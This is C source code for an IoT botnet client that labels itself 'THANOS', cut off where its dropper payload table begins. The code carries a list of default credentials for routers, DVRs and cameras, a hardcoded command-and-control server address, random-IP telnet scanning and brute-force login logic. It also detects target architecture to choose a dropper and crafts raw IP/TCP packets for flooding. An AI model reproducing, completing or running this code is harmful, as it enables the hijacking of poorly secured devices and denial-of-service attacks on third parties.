#define _GNU_SOURCE


//#############################################
//#############################################
//[THANOS] BUILD 1.0
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <dirent.h>
#include <ctype.h>
#include <linux/prctl.h>
#include <sys/prctl.h>
#define PR_SET_NAME 15
#define PHI 0x9e3779b9
#define SOCK_BUFSIZE 2048
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3

char *inet_ntoa(struct in_addr in);
unsigned char macAddress[6] = {0};

char *usernames[] = {
    "admin\0",
    "admin\0", //guest:12345
    "admin\0",
    "default\0",  //default:
    "guest\0",
    "telecomadmin\0",
    "root\0",
    "e8ehome\0", //e8ehome:e8ehomeusr
    "telnetadmin\0", 
    "e8telnet\0", //e8telnet:e8telnet
    "nr2g\0",
    "user\0",
    "e8ehome1\0",    //e8ehome1:e8ehome1
    "vstarcam2015\0",  //vstarcam2015:20150602
    "root\0", //root:vizxv
    "root\0", //root:xc3511
    "root\0", //root:antslq
    "root\0",
    "realtek\0",
    "root\0", //root:123456
    "support\0", //support:support
    "root\0", //root:5up
    "operator\0" //operator:operator
  };
char *passwords[] = {
    "admin\0",
    "admin\0",
    "7ujMko0admin\0"
    "\0", 
    "12345\0",
    "nE7jA%5m\0",
    "hg2x0\0",
    "e8ehome\0", 
    "telnetadmin\0", //telnetadmin:telnetadmin
    "e8telnet\0", 
    "digitel\0",
    "digi\0",
    "e8ehome1\0", 
    "20150602\0", 
    "vizxv\0", 
    "xc3511\0", 
    "antslq\0", 
    "realtek\0",
    "123456\0",
    "Zte521\0", 
    "support\0", 
    "5up\0", 
    "operator\0"};
char *elf_response[] = {"ELF", 0};
char *login_prompts[] = {":", "user", "ogin", "name", "pass", "dvrdvs", "assword:", (char*)0};          
char *fail_prompts[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};    
char *fail_or_success[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", "shell", "dvrdvs", 0};
char *success_prompts[] = {"busybox", "$", "#", "shell", "dvrdvs", (char*)0};
char *tmp_dirs[] = {"/var/", "/var/tmp/", "/var/run/", "/tmp/", "/dev/", "/",  "/dev/shm/", 0};
char *echofinished[] = {"BAPE", 0 };
char *execmsg[] = {"HOODFAVE", 0};
char *wgetcheck[] = {"wget: applet not found", 0};
char *tftpcheck[] = {"tftp: applet not found", 0};
char *choosemethod[] = {": applet not found", 0};
int mainport = 979;
int currentServer = -1;
uint32_t scanPid;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
int uhmysockethere = 0;
static uint32_t x, y, z, w;

unsigned char *commServer[] = { "104.192.1.2:3301"};

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) 
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}
void rand_str(char *str, int len) 
{
    while (len > 0)
    {
        if (len >= 4)
        {
            *((uint32_t *)str) = rand_next();
            str += sizeof (uint32_t);
            len -= sizeof (uint32_t);
        }
        else if (len >= 2)
        {
            *((uint16_t *)str) = rand_next() & 0xFFFF;
            str += sizeof (uint16_t);
            len -= sizeof (uint16_t);
        }
        else
        {
            *str++ = rand_next() & 0xFF;
            len--;
        }
    }
}

void rand_alphastr(uint8_t *str, int len)
{
    const char alphaset[] = "2bl4MqWdFieamkf56RIrUEoAKVLZOSQHTX1tpYJDuj8cn7CgswBvNPh0G3";

    while (len > 0)
    {
        if (len >= sizeof (uint32_t))
        {
            int i;
            uint32_t entropy = rand_next();

            for (i = 0; i < sizeof (uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;

                entropy = entropy >> 8;
                tmp = tmp >> 3;

                *str++ = alphaset[tmp];
            }
            len -= sizeof (uint32_t);
        }
        else
        {
            *str++ = rand_next() % (sizeof (alphaset));
            len--;
        }
    }
}
int util_strlen(char *str)
{
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
uint8_t ipState[5] = {0};
in_addr_t scantelnetip() {
        ipState[0] = rand() % 223;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
          while
             (
        ipState[0] == 127 || ipState[0] == 0 || (ipState[0] == 192 && ipState[1] == 168)
          )
        {
                ipState[0] = rand() % 223;
                ipState[1] = rand() % 255;
                ipState[2] = rand() % 255;
                ipState[3] = rand() % 255;
        }
        char ip[16] = {0};
        sprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}
unsigned short csum (unsigned short *buf, int count) {
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
        struct tcp_pseudo {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
static void printchar(unsigned char **str, int c)
{
    if (str) {
        **str = c;
        ++(*str);
    }
    else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
    register int pc = 0, padchar = ' ';

    if (width > 0) {
        register int len = 0;
        register const unsigned char *ptr;
        for (ptr = string; *ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad & PAD_ZERO) padchar = '0';
    }
    if (!(pad & PAD_RIGHT)) {
        for ( ; width > 0; --width) {
            printchar (out, padchar);
            ++pc;
        }
    }
    for ( ; *string ; ++string) {
        printchar (out, *string);
        ++pc;
    }
    for ( ; width > 0; --width) {
        printchar (out, padchar);
        ++pc;
    }

    return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints (out, print_buf, width, pad);
    }

    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN-1;
    *s = '\0';

    while (u) {
        t = u % b;
        if( t >= 10 )
        t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if( width && (pad & PAD_ZERO) ) {
            printchar (out, '-');
            ++pc;
            --width;
        }
        else {
            *--s = '-';
        }
    }

    return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];

    for (; *format != 0; ++format) {
        if (*format == '%') {
            ++format;
            width = pad = 0;
            if (*format == '\0') break;
            if (*format == '%') goto out;
            if (*format == '-') {
                ++format;
                pad = PAD_RIGHT;
            }
            while (*format == '0') {
                ++format;
                pad |= PAD_ZERO;
            }
            for ( ; *format >= '0' && *format <= '9'; ++format) {
                width *= 10;
                width += *format - '0';
            }
            if( *format == 's' ) {
                register char *s = (char *)va_arg( args, int );
                pc += prints (out, s?s:"(null)", width, pad);
                continue;
            }
            if( *format == 'd' ) {
                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                continue;
            }
            if( *format == 'x' ) {
                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                continue;
            }
            if( *format == 'X' ) {
                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                continue;
            }
    
            if( *format == 'u' ) {
                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                continue;
            }
            if( *format == 'c' ) {
                scr[0] = (unsigned char)va_arg( args, int );
                scr[1] = '\0';
                pc += prints (out, scr, width, pad);
                continue;
            }
        }
        else {
out:
            printchar (out, *format);
            ++pc;
        }
    }
    if (out) **out = '\0';
    va_end( args );
    return pc;
}

int zprintf(const unsigned char *format, ...)
{
    va_list args;
    va_start( args, format );
    return print( 0, format, args );
}
int thanosprint(int sock, char *string, ...)
{
    char buffer[SOCK_BUFSIZE];
    memset(buffer, 0, SOCK_BUFSIZE);

    va_list args;
    va_start(args, string);
    vsprintf(buffer, string, args);
    va_end(args);

 // printf("[debug] >>> %s", buffer);
 
    return send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
}
int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}
static int *fdopen_pids;

int fdpclose(int iop)
{
    register int fdes;
    sigset_t omask, nmask;
    int pstat;
    register int pid;

    if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
    (void) close(iop);
    sigemptyset(&nmask);
    sigaddset(&nmask, SIGINT);
    sigaddset(&nmask, SIGQUIT);
    sigaddset(&nmask, SIGHUP);
    (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
    do {
        pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
    } while (pid == -1 && errno == EINTR);
    (void) sigprocmask(SIG_SETMASK, &omask, NULL);
    fdopen_pids[fdes] = 0;
    return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}


int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);

        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }

                        break;
                }
        }

        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;

        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(uhmysockethere, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}
int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }
        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}
int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}
int iac_negotiate(int sock, unsigned char *buf)
{
    unsigned char c;

    switch (buf[1]) {
    case CMD_IAC: return 0;
    case CMD_WILL:
    case CMD_WONT:
    case CMD_DO:
    case CMD_DONT:
        c = CMD_IAC;
        send(sock, &c, 1, MSG_NOSIGNAL);
        if (CMD_WONT == buf[1]) c = CMD_DONT;
        else if (CMD_DONT == buf[1]) c = CMD_WONT;
        else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
        else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
        send(sock, &c, 1, MSG_NOSIGNAL);
        send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
        break;

    default:
        break;
    }

    return 0;
}
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}

struct telnet_state_t
{
int fd;
uint8_t complete, state, endianness, dropper_index, bit;
uint32_t machine;
unsigned int ip;
unsigned char usernind;
unsigned char pwordind;
unsigned int ttltimeout;
char sock_buffer[SOCK_BUFSIZE], arch[32];
char *sockbuf;
};
void set_state(struct telnet_state_t *telnet_state, int new_state)
{
    telnet_state->ttltimeout = time(NULL);
    memset(telnet_state->sock_buffer, 0, SOCK_BUFSIZE);
    telnet_state->state = new_state;
}
void reset_telnet_state(struct telnet_state_t *telnet_state, int complete)
{
    telnet_state->ttltimeout = 0;
    memset(telnet_state->sock_buffer, 0, SOCK_BUFSIZE);
    close(telnet_state->fd);
    telnet_state->fd = -1;
    telnet_state->complete = complete;
    telnet_state->state = 0;
    telnet_state->dropper_index = 0;
    telnet_state->bit = 0;
    telnet_state->endianness = 0;
    telnet_state->machine = 0;
    if(telnet_state->complete == 1){
        telnet_state->bit = 0;
        telnet_state->endianness = 0;
        telnet_state->machine = 0;
        memset(telnet_state->arch, 0, 32);
    }
}
int compare_strings(char *buffer, char **strings)
{
    int i = 0;
    int num_of_strings = 0;
    
    for(num_of_strings = 0; strings[++num_of_strings] != 0;);
    
    for(i = 0; i < num_of_strings; i++)
    {
        if(strcasestr(buffer, strings[i]))
        {
            return 1;
        }
    }
    
    return 0;
}
const char* get_telnet_state_host(struct telnet_state_t *telnet_state) { 
        struct in_addr in_addr_ip; 
        in_addr_ip.s_addr = telnet_state->ip;
        return inet_ntoa(in_addr_ip);   
}

int read_until_response(int fd, int timeout_usec, unsigned char *buffer, int buffer_size, char **strings)
{
    memset(buffer, 0, buffer_size);

    fd_set myset;
    struct timeval tv;

    tv.tv_sec = 9;
    tv.tv_usec = timeout_usec;

    FD_ZERO(&myset);
    FD_SET(fd, &myset);
    
    if(select(fd + 1, &myset, NULL, NULL, &tv) < 1)
        return 0;

    recv(fd, buffer, buffer_size, 0);

    if(buffer[0] == 0xFF)
    {
        iac_negotiate(fd, buffer);
    }

    if(compare_strings(buffer, strings))
    {
        return 1;
    }

    return 0;
}

enum
{
    NUM_OF_PAYLOADS = 11,
    ENDIAN_LITTLE = 1,
    ENDIAN_BIG = 2,
    BIT_32 = 1,
    BIT_64 = 2,
    EM_NONE = 0,
    EM_SPARC = 2,
    EM_ARM = 40,
    EM_386 = 3,
    EM_68K = 4,
    EM_MIPS = 8,
    EM_PPC = 20,
    EM_X86_64 = 62,
    EM_SH = 42,
    EM_ARC = 93,
    MAX_ECHO_BYTES = 128,
};

static int parse_elf_response(struct telnet_state_t *fd)
{
    int i = 0;
    char *elf_magic = "\x7f\x45\x4c\x46";
    int pos = 0;
    char *tmp;
    //thanosprint(uhmysockethere, "elf buf %s\n", fd->sock_buffer);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     

    for(i = 0; i < SOCK_BUFSIZE; i++)
    {
        if(fd->sock_buffer[i] == elf_magic[pos])
        {
            if(++pos == 4)
            {
                pos = i;
                break;
            }
        }
        else
        {
            pos = 0;
        }
    }

    if(pos == 0)
        return 0;
    //thanosprint(uhmysockethere, "got elf magic at position %d\n", pos);

    fd->bit = fd->sock_buffer[pos + 0x01];
    fd->endianness = fd->sock_buffer[pos + 0x02];
    fd->machine = fd->sock_buffer[pos + 0xF];
    

    if(fd->machine == EM_NONE)
        return 0;

    if(fd->machine == EM_ARM)
        tmp = "arm";
    else if(fd->machine == EM_SPARC)
        tmp = "sparc";
    else if(fd->machine == EM_386)
        tmp = "i686";
    else if(fd->machine == EM_68K)
        tmp = "m68k";
    else if(fd->machine == EM_PPC)
        tmp = "powerpc";
    else if(fd->machine == EM_ARC)
        tmp = "arc";
    else if(fd->machine == EM_SH)
        tmp = "superh";
    else if(fd->machine == EM_X86_64)
        tmp = "x86_64";
    else if(fd->machine == EM_MIPS && fd->endianness != ENDIAN_LITTLE)
        tmp = "mips";
    else if(fd->machine == EM_MIPS && fd->endianness == ENDIAN_LITTLE)
        tmp = "mipsel";
    else
        return 0;

    memcpy(fd->arch, tmp, strlen(tmp));
    return 1;
}

struct payload
{
    uint8_t bit;
    uint8_t endian;
    uint8_t machine;
    char *str;
    uint16_t len;
};

struct binary
{
    char *str;
    uint8_t index;
};

 
    // Bit


// next time check droppers.txt to save your time
struct payload payloads[11] =

{
    // arm
